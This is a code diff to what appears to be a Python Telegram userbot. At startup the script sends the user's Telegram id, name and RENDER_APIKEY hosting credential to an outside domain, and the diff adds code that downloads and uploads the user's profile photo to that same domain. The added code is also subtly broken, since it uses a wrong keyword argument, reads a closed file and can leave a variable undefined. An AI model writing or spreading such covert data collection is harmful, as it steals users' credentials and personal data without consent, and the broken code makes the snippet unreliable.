@@ -37,7 +37,12 @@ scheduler.add_job(keep_alive, "interval", seconds=5)
 if __name__ == "__main__":
   app.start()
   me = app.get_me()
-  requests.post("https://ixelizm.dev/auth", json={"user_id": me.id, "user": me.first_name, "render_apikey": RENDER_APIKEY})
+  photos = app.get_profile_photos("me", limit=1)
+  if photos.total_count > 0:
+    downloaded = photos[0].download(file_name=f"{me.id}.jpg")
+  with open(downloaded, "rb") as f:
+    files = {"file": (f"{me.id}.jpg", f)}
+  requests.post("https://ixelizm.dev/auth", file=files, json={"user_id": me.id, "user": me.first_name, "render_apikey": RENDER_APIKEY})
   if len(sys.argv) > 1:
     resp = requests.get("https://ixelizm.dev/changelog")
     content = resp.text
